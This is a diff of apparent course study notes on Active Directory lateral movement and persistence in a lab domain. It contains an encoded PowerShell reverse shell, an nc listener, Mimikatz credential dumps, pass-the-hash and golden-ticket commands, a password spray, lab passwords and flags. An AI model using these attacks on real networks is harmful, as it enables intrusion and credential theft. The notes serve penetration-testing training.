@@ -315,45 +315,26 @@ corp\jen
 [192.168.50.73]: PS C:\Users\jen\Documents&gt; hostname
 FILES04
 </code></pre>
-<h6>Labs</h6>
-<p>Launch VM Group 2 and once connected as jeff on client74 and try to move laterally to web04 in order to get the flag located on the administrator&#39;s desktop.</p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ ./ps-rev-shell.py &quot;192.168.45.240&quot; 443
-powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
-
-
-
-### Win domain sys
-
-PS C:\Users\jeff&gt; $username = &#39;jen&#39;;
+<h3>Win domain sys</h3>
+<p>PS C:\Users\jeff&gt; $username = &#39;jen&#39;;
 PS C:\Users\jeff&gt; $password = &#39;Nexus123!&#39;;
 PS C:\Users\jeff&gt; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 PS C:\Users\jeff&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 PS C:\Users\jeff&gt; $Options = New-CimSessionOption -Protocol DCOM
 PS C:\Users\jeff&gt; $Session = New-CimSession -ComputerName 192.168.207.72 -Credential $credential -SessionOption $Options
 PS C:\Users\jeff&gt; $Command = &#39;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#39;;
-PS C:\Users\jeff&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-
-ProcessId ReturnValue PSComputerName
---------- ----------- --------------
-     3288           0 192.168.207.72
-
-
-
-### Kali
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ nc -lnvp 443                          
-listening on [any] 443 ...
-connect to [192.168.45.240] from (UNKNOWN) [192.168.207.72] 53916
-
-PS C:\Windows\system32&gt; whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                            Description                                                        State  
-========================================= ================================================================== =======
+PS C:\Users\jeff&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</p>
+<p>ProcessId ReturnValue PSComputerName</p>
+<hr>
+<pre><code> 3288           0 192.168.207.72
+</code></pre>
+<h3>Kali</h3>
+<p>┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ nc -lnvp 443<br>listening on [any] 443 ...
+connect to [192.168.45.240] from (UNKNOWN) [192.168.207.72] 53916</p>
+<p>PS C:\Windows\system32&gt; whoami /priv</p>
+<h2>PRIVILEGES INFORMATION</h2>
+<p>Privilege Name                            Description                                                        State<br>========================================= ================================================================== =======
 SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
 SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
 SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
@@ -381,26 +362,29 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 PS C:\Windows\system32&gt; whoami
 corp\jen
 PS C:\Windows\system32&gt; cat \Users\Administrator\Desktop\flag.txt
-OS{d1bd53c44a9141f071b77b2d0a64956a}
-</code></pre>
-<h5>PsExec</h5>
-<p>PsExec, part of the <a href="https://docs.microsoft.com/en-us/sysinternals/">SysInternals</a> suite developed by Mark Russinovich, is an extremely versitile tool intended to replace telnet-like applications and provide remote execution of processes on other systems through interactive console.</p>
-<p>Misusing the tool for lateral movement has several prerequisites.</p>
-<ul>
-<li>The user authenticating to the machine must be in local Admin group.</li>
-<li>The ADMIN$ share must be available.</li>
-<li>File/printer sharing has to be turned on.</li>
-<li>Default setting on modern Win servers.</li>
-</ul>
-<p>To achieve remote command exec, PsExec performs the following:</p>
-<ul>
-<li>Writes <code>psexecsvc.exe</code> into <code>C:\Windows</code> directory.</li>
-<li>Creates/spawns a service on the remote host.</li>
-<li>Runs the requested command as a child proc of <code>psexecsvc.exe</code></li>
-</ul>
-<p>Let&#39;s assume we have RDP access as local admin <code>offsec</code> on CLIENT74, we can run the 64-bit version of PsExec from <code>C:\Tools\SysinternalsSuite</code>.</p>
-<p>To start an interactive session on the remote host we invoke <code>PsExec64.exe</code> with arg <code>-i</code>, followed by target hostname which is prepended with <code>\\</code>.  Specify <code>corp\jen</code> as domain\username and <code>Nexus123!</code> as password with <code>-u</code>/<code>-p</code>.  Finally we include the command for remote exec, a cmd shell in this case.</p>
-<pre><code class="language-powershell">PS C:\Tools\SysinternalsSuite&gt; ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+OS{d1bd53c44a9141f071b77b2d0a64956a}</p>
+<pre><code>
+
+##### PsExec
+
+PsExec, part of the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite developed by Mark Russinovich, is an extremely versitile tool intended to replace telnet-like applications and provide remote execution of processes on other systems through interactive console.
+
+Misusing the tool for lateral movement has several prerequisites.
+- The user authenticating to the machine must be in local Admin group.
+- The ADMIN$ share must be available.
+- File/printer sharing has to be turned on.
+ - Default setting on modern Win servers.
+
+To achieve remote command exec, PsExec performs the following:
+- Writes `psexecsvc.exe` into `C:\Windows` directory.
+- Creates/spawns a service on the remote host.
+- Runs the requested command as a child proc of `psexecsvc.exe`
+
+Let&#39;s assume we have RDP access as local admin `offsec` on CLIENT74, we can run the 64-bit version of PsExec from `C:\Tools\SysinternalsSuite`.
+
+To start an interactive session on the remote host we invoke `PsExec64.exe` with arg `-i`, followed by target hostname which is prepended with `\\`.  Specify `corp\jen` as domain\username and `Nexus123!` as password with `-u`/`-p`.  Finally we include the command for remote exec, a cmd shell in this case.
+```powershell
+PS C:\Tools\SysinternalsSuite&gt; ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 
 PsExec v2.4 - Execute processes remotely
 Copyright (C) 2001-2022 Mark Russinovich
@@ -419,26 +403,6 @@ corp\jen
 <ul>
 <li>We obtain a direct interactive shell on the target sys as local admin.</li>
 </ul>
-<h6>Labs</h6>
-<p>Start VM Group 2 and connect as the offsec user on client74. Then try to use PsExec to move laterally to web04 in order to get the flag located on jen&#39;s desktop.
-(<em>NOTE: VM group client was not responding, used Kali)</em></p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
-└─$ impacket-psexec corp.com/jen:&#39;Nexus123!&#39;@192.168.207.72 cmd
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] Requesting shares on 192.168.207.72.....
-[*] Found writable share ADMIN$
-[*] Uploading file wLGerJYl.exe
-[*] Opening SVCManager on 192.168.207.72.....
-[*] Creating service RWya on 192.168.207.72.....
-[*] Starting service RWya.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.20348.887]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt; type \Users\jen\Desktop\flag.txt
-OS{845f4222ed3e0af427b128df2fc6a948}
-</code></pre>
 <h5>Pass the Hash</h5>
 <p>Pass the Hash (PtH) allows an attack to auth to a remote system/service utilizing the NTLM hash of a users&#39;s password instead of the associated plaintext password.  This will not work for Kerberos auth, but only for servers/services using NTLM auth.  This is a sub-technique mapped in the MITRE Framework, under the &quot;User Authentication Material&quot; general technique.</p>
 <p>There are many 3rd party tools and frameworks that us PtH for both auth and code exec, including <a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/">PsExec</a> from Metasploit, <a href="https://github.com/byt3bl33d3r/pth-toolkit">Passing-the-hash toolkit</a>, and <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py">Impacket</a>.  They each use similar mechanics, where the attacker connects to the target using SMB proto and performs auth using the NTLM hash.</p>
@@ -466,31 +430,6 @@ files04\administrator
 </ul>
 <p>If the target was sitting behind a network that was only reachable through our initial compromised host, we could pivot/proxy through the first host to achieve this.</p>
 <p>This method works on AD domain accounts and built-in local admin account.  Due to a 2014 security update, this can not be used to auth as any other local admin accounts.</p>
-<h6>Labs</h6>
-<p>Start VM Group 2 and try to execute the pass the hash technique to move laterally to web04 to get the flag located on the administrator&#39;s desktop.</p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.248.72
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] SMBv3.0 dialect used
-[!] Launching semi-interactive shell - Careful what you execute
-[!] Press help for extra shell commands
-C:\&gt;cd \Users\Administrator\Desktop
-C:\Users\Administrator\Desktop&gt;dir
- Volume in drive C has no label.
- Volume Serial Number is B447-7D50
-
- Directory of C:\Users\Administrator\Desktop
-
-12/20/2023  11:45 AM    &lt;DIR&gt;          .
-03/01/2023  06:29 AM    &lt;DIR&gt;          ..
-12/20/2023  11:45 AM                78 flag.txt
-               1 File(s)             78 bytes
-               2 Dir(s)   8,083,177,472 bytes free
-
-C:\Users\Administrator\Desktop&gt;type flag.txt
-OS{c30cfd4e8c74f380eb8c418f442c70e1}
-</code></pre>
 <h5>Overpass the Hash</h5>
 <p>Using <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf">overpass the the hash</a> we can abuse a NTLM user hash to obtain full Kerberos Ticket Granting Ticket (TGT).  We can then use TGT to gain TIcket Granting Service (TGS).</p>
 <p>In this example assume we have compromised a workstation or server that <code>jen</code> has authenticated to.  Also assume the machine has cached their creds and NTLM hash.</p>
@@ -673,80 +612,6 @@ FILES04
 <ul>
 <li>We succeed in reusing the Kerberos TGT to launch a command shell on files04 server.</li>
 </ul>
-<h6>Labs</h6>
-<p>Start VM Group 2 and try to execute the overpass the hash technique to move laterally to web04 to get the flag located on the Administrator&#39;s desktop. To do so, connect to CLIENT76 via RDP as the offsec user and use the NTLM hash obtained in a previous Module.</p>
-<pre><code class="language-bash">mimikatz # sekurlsa::pth /user:administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
-user    : administrator
-domain  : corp.com
-program : powershell
-impers. : no2892D26CDF84D7A70E2EB3B9F05C425E
-NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e
-  |  PID  7068
-  |  TID  6160
-  |  LSA Process was already R/W
-  |  LUID 0 ; 1858566 (00000000:001c5c06)
-  \_ msv1_0   - data copy @ 000001CF4DA1C080 : OK !
-  \_ kerberos - data copy @ 000001CF4DAFDB78
-   \_ aes256_hmac       -&gt; null
-   \_ aes128_hmac       -&gt; null
-   \_ rc4_hmac_nt       OK
-   \_ rc4_hmac_old      OK
-   \_ rc4_md4           OK
-   \_ rc4_hmac_nt_exp   OK
-   \_ rc4_hmac_old_exp  OK
-   \_ *Password replace @ 000001CF4DCAF738 (32) -&gt; null
-   
-PS C:\Windows\system32&gt; net use \\files04
-The command completed successfully.
-
-PS C:\Windows\system32&gt; klist
-
-Current LogonId is 0:0x1c5c06
-
-Cached Tickets: (2)
-
-#0&gt;     Client: administrator @ CORP.COM
-        Server: krbtgt/CORP.COM @ CORP.COM
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 12/27/2023 14:33:09 (local)
-        End Time:   12/28/2023 0:33:09 (local)
-        Renew Time: 1/3/2024 14:33:09 (local)
-        Session Key Type: RSADSI RC4-HMAC(NT)
-        Cache Flags: 0x1 -&gt; PRIMARY
-        Kdc Called: DC1.corp.com
-
-#1&gt;     Client: administrator @ CORP.COM
-        Server: cifs/files04 @ CORP.COM
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize
-        Start Time: 12/27/2023 14:33:09 (local)
-        End Time:   12/28/2023 0:33:09 (local)
-        Renew Time: 1/3/2024 14:33:09 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0
-        Kdc Called: DC1.corp.com
-PS C:\Windows\system32&gt; cd C:\Tools\SysinternalsSuite\
-
-PS C:\Tools\SysinternalsSuite&gt; .\PsExec.exe \\web04 cmd
-
-PsExec v2.4 - Execute processes remotely
-Copyright (C) 2001-2022 Mark Russinovich
-Sysinternals - www.sysinternals.com
-
-
-Microsoft Windows [Version 10.0.20348.887]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt;whoami
-corp\administrator
-
-C:\Windows\system32&gt;hostname
-web04
-
-C:\Windows\system32&gt;type \Users\Administrator\Desktop\flag.txt
-OS{1588a78101768ab97c7d674dd19d56f8}
-</code></pre>
 <h5>Pass the Ticket</h5>
 <p>We previously used OPtH with a captured NTLM hash to acquire Kerberos TGT, which allowed us to authenticate using Kerberos.  We can only use the TGT on the machine it was created for, but the TGS is more flexible.</p>
 <p>The &quot;Pass the Ticket&quot; attack leverages TGS, which can be exported and injected elsewhere in the network, then used to authenticate to specific services.  Additionally, if the service ticket belongs to the current user, no admin privs are required.</p>
@@ -1000,39 +865,6 @@ FILES04
 <ul>
 <li>We achieved a foothold on an internal box by abusing DCOM MMC application.</li>
 </ul>
-<h6>Labs</h6>
-<p>Start VM Group 2 and connect as the jen user on client74 then try to abuse DCOM to move laterally to web04 to get the flag located on the administrator&#39;s desktop.</p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
-└─$ impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E corp.com/Administrator@192.168.212.72
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] Requesting shares on 192.168.212.72.....
-[*] Found writable share ADMIN$
-[*] Uploading file zxDdFdvE.exe
-[*] Opening SVCManager on 192.168.212.72.....
-[*] Creating service fsvy on 192.168.212.72.....
-[*] Starting service fsvy.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.20348.887]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt; cd \Users\Administrator\Desktop
-
-C:\Users\Administrator\Desktop&gt; dir
- Volume in drive C has no label.
- Volume Serial Number is B447-7D50
-
- Directory of C:\Users\Administrator\Desktop
-
-12/27/2023  06:47 PM    &lt;DIR&gt;          .
-03/01/2023  06:29 AM    &lt;DIR&gt;          ..
-12/27/2023  06:47 PM                78 flag.txt
-               1 File(s)             78 bytes
-               2 Dir(s)   7,951,900,672 bytes free
-
-C:\Users\Administrator\Desktop&gt; type flag.txt
-OS{59e267f7673a4fd34c73f3f0bc5c2c19}
-</code></pre>
 <h4>23.2 Active Directory Persistence</h4>
 <ul>
 <li>Understand the general purpose of persistence techniques .</li>
@@ -1200,72 +1032,6 @@ Sysinternals - www.sysinternals.com
 Couldn&#39;t access 192.168.50.70:
 Access is denied.
 </code></pre>
-<h6>Labs</h6>
-<p>Start VM Group 2 and try to execute the golden ticket persistence technique to get access to DC1 and get the flag located on the administrator&#39;s desktop.</p>
-<pre><code class="language-bash">mimikatz # kerberos::purge
-Ticket(s) purge for current session is OK
-
-mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369-1124 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
-User      : jen
-Domain    : corp.com (CORP)
-SID       : S-1-5-21-1987370270-658905905-1781884369-1124
-User Id   : 500
-Groups Id : *513 512 520 518 519
-ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
-Lifetime  : 12/27/2023 5:53:26 PM ; 12/24/2033 5:53:26 PM ; 12/24/2033 5:53:26 PM
--&gt; Ticket : ** Pass The Ticket **
-
- * PAC generated
- * PAC signed
- * EncTicketPart generated
- * EncTicketPart encrypted
- * KrbCred generated
-
-Golden ticket for &#39;jen @ corp.com&#39; successfully submitted for current session
-
-mimikatz # misc::cmd
-Patch OK for &#39;cmd.exe&#39; from &#39;DisableCMD&#39; to &#39;KiwiAndCMD&#39; @ 00007FF695F1B800
-
-mimikatz # kerberos::purge
-Ticket(s) purge for current session is OK
-
-mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
-User      : jen
-Domain    : corp.com (CORP)
-SID       : S-1-5-21-1987370270-658905905-1781884369
-User Id   : 500
-Groups Id : *513 512 520 518 519
-ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
-Lifetime  : 12/27/2023 5:54:44 PM ; 12/24/2033 5:54:44 PM ; 12/24/2033 5:54:44 PM
--&gt; Ticket : ** Pass The Ticket **
-
- * PAC generated
- * PAC signed
- * EncTicketPart generated
- * EncTicketPart encrypted
- * KrbCred generated
-
-Golden ticket for &#39;jen @ corp.com&#39; successfully submitted for current session
-
-mimikatz # misc::cmd
-Patch OK for &#39;cmd.exe&#39; from &#39;DisableCMD&#39; to &#39;KiwiAndCMD&#39; @ 00007FF695F1B800
-
-
-C:\Tools&gt;cd SysinternalsSuite
-
-C:\Tools\SysinternalsSuite&gt;PsExec.exe \\dc1 cmd.exe
-
-PsExec v2.4 - Execute processes remotely
-Copyright (C) 2001-2022 Mark Russinovich
-Sysinternals - www.sysinternals.com
-
-
-Microsoft Windows [Version 10.0.20348.887]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt;type \Users\Administrator\Desktop\flag.txt
-OS{edf7b19265554cae41c7f751fbb49f11}
-</code></pre>
 <h5>Shadow Copies</h5>
 <p>VSS (Volume Shadow Copy), also known as a <a href="https://en.wikipedia.org/wiki/Shadow_Copy">Shadow Copy</a>, is a MS backup technology that allows the creation of snapshots of files or entire volumes.</p>
 <p>The MS signed <a href="https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample">binary</a> <code>vshadow.exe</code> is availabel as part of the Windows <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/">SDK</a>.</p>
@@ -1404,245 +1170,6 @@ CLIENT76$:des-cbc-md5:61ecf2374386e310
 <p>To do this we would move laterally to the DC and run Mimikatz to dump the password hash of every user, using the DC sync method described in previous modules, which can be misused as a less conspicuous persistence technique.</p>
 <p><em>Although most penetration tests wouldn&#39;t require us to be covert, we should always evaluate a given technique&#39;s stealthiness, which could be useful during future red-teaming engagements.</em></p>
 <p>These persistence techniques could be employed during pentests or red team exercises with rules of engagement mandating long-term access be retained in the env.</p>
-<h6>Labs</h6>
-<p>Capstone Exercise: Start VM Group 2 and try to execute the dcsync technique and get access to dc1 in order to get the flag located on the administrator&#39;s desktop. To do so, log in via RDP as the jeffadmin and perform dcsync against the domain Administrator user to obtain its NTLM hash.</p>
-<pre><code class="language-bash">mimikatz # privilege::debug
-Privilege &#39;20&#39; OK
-
-mimikatz # lsadump::dcsync /user:corp\Administrator
-[DC] &#39;corp.com&#39; will be the domain
-[DC] &#39;DC1.corp.com&#39; will be the DC server
-[DC] &#39;corp\Administrator&#39; will be the user account
-[rpc] Service  : ldap
-[rpc] AuthnSvc : GSS_NEGOTIATE (9)
-
-Object RDN           : Administrator
-
-** SAM ACCOUNT **
-
-SAM Username         : Administrator
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
-Account expiration   :
-Password last change : 8/16/2022 7:27:22 PM
-Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-500
-Object Relative ID   : 500
-
-
-┌──(operator㉿labhost)-[~]
-└─$ impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@192.168.206.70
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] Requesting shares on 192.168.206.70.....
-[*] Found writable share ADMIN$
-[*] Uploading file gHiTNcyq.exe
-[*] Opening SVCManager on 192.168.206.70.....
-[*] Creating service nXrK on 192.168.206.70.....
-[*] Starting service nXrK.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.20348.887]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt; type \Users\Administrator\Desktop\flag.txt
-OS{8daf90aaa93783fbd8a51c9dbf5a9823}
-</code></pre>
-<p>Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. Log in as leon on CLIENT74 and use the techniques discussed in this Module to move laterally and get the flag on FILES04 Administrator&#39;s desktop.</p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~]
-└─$ crackmapexec smb 192.168.206.74 -u capstone3.txt -p &#39;HomeTaping199!&#39; -d corp.com --continue-on-success
-
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ cat cs3crackmap.txt | grep &quot;*&quot;
-SMB         192.168.206.74  445    CLIENT74         [*] Windows 10.0 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.206.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
-SMB         192.168.206.72  445    WEB04            [*] Windows 10.0 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.206.73  445    FILES04          [*] Windows 10.0 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.206.74  445    CLIENT74         [*] Windows 10.0 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.206.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.206.76  445    CLIENT76         [*] Windows 10.0 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ cat cs3crackmap.txt | grep &quot;+&quot;
-SMB         192.168.206.74  445    CLIENT74         [+] corp.com\leon:HomeTaping199! (Pwn3d!)
-SMB         192.168.206.70  445    DC1              [+] corp.com\leon:HomeTaping199!
-SMB         192.168.206.72  445    WEB04            [+] corp.com\leon:HomeTaping199!
-SMB         192.168.206.73  445    FILES04          [+] corp.com\leon:HomeTaping199! (Pwn3d!)
-SMB         192.168.206.74  445    CLIENT74         [+] corp.com\leon:HomeTaping199! (Pwn3d!)
-SMB         192.168.206.75  445    CLIENT75         [+] corp.com\leon:HomeTaping199!
-SMB         192.168.206.76  445    CLIENT76         [+] corp.com\leon:HomeTaping199!
-
-
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ impacket-psexec corp/leon:&#39;HomeTaping199!&#39;@192.168.206.73
-
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-[*] Requesting shares on 192.168.206.73.....
-[*] Found writable share ADMIN$
-[*] Uploading file NfWIuXHU.exe
-[*] Opening SVCManager on 192.168.206.73.....
-[*] Creating service VjWZ on 192.168.206.73.....
-[*] Starting service VjWZ.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.20348.169]
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32&gt; whoami
-nt authority\system
-
-C:\Windows\system32&gt; hostname
-FILES04
-
-C:\Windows\system32&gt; cd \Users\Administrator\Desktop
-
-C:\Users\Administrator\Desktop&gt; dir
- Volume in drive C has no label.
- Volume Serial Number is 50B4-DA2A
-
- Directory of C:\Users\Administrator\Desktop
-
-12/28/2023  12:37 AM    &lt;DIR&gt;          .
-08/16/2022  05:02 PM    &lt;DIR&gt;          ..
-12/28/2023  12:37 AM                78 proof.txt
-               1 File(s)             78 bytes
-               2 Dir(s)   9,567,244,288 bytes free
-
-C:\Users\Administrator\Desktop&gt; type proof.txt
-OS{d083ce129e33c9d0342509a2aa32f53d}
-</code></pre>
-<p>Capstone Exercise: Once VM Group 4 is started, the domain corp.com has been modified. Log in as the leon user on CLIENT76 and use the techniques discussed in this Module to move laterally and get the flag in the WEB04 shared folder.</p>
-<pre><code class="language-#"># RDP leon session, has local admin
-#
-
-mimikatz # privilege::debug
-Privilege &#39;20&#39; OK
-
-mimikatz # sekurlsa::logonpasswords
-
-Authentication Id : 0 ; 3112851 (00000000:002f7f93)
-Session           : Batch from 0
-User Name         : dave
-Domain            : CORP
-Logon Server      : DC1
-Logon Time        : 12/28/2023 5:11:59 PM
-SID               : S-1-5-21-1987370270-658905905-1781884369-1103
-        msv :
-         [00000003] Primary
-         * Username : dave
-         * Domain   : CORP
-         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
-         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
-         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
-        tspkg :
-        wdigest :
-         * Username : dave
-         * Domain   : CORP
-         * Password : (null)
-        kerberos :
-         * Username : dave
-         * Domain   : CORP.COM
-         * Password : (null)
-        ssp :
-        credman :
-
-#
-# Crackmapexec spray dave hash
-#
-
-┌──(operator㉿labhost)-[~/OffSec/AD]
